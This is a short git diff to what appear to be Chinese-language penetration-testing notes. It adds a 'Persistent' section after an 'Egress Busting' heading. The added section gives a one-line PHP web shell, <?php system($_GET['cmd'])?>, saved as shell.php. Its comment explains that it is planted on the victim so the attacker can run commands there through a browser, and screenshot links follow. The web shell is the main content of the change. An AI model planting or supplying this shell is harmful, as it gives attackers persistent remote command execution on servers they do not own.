@@ -221,4 +221,8 @@ Egress Busting
 ![image](https://github.com/user-attachments/assets/75e98ff4-99d2-41db-a7c5-afd50fbbf144)
 ![image](https://github.com/user-attachments/assets/5408a88b-1809-4dc7-b643-28173c81fb1a)
 
-
+Persistent
+---
+    <?php system($_GET['cmd'])?> shell.php 在受害端塞入shell，透過攻擊端瀏覽器執行受害端的指令
+![image](https://github.com/user-attachments/assets/718b8329-bbc6-4eda-909e-f2f4a419594c)
+![image](https://github.com/user-attachments/assets/ab920de5-84ee-49ab-91af-49233a804632)
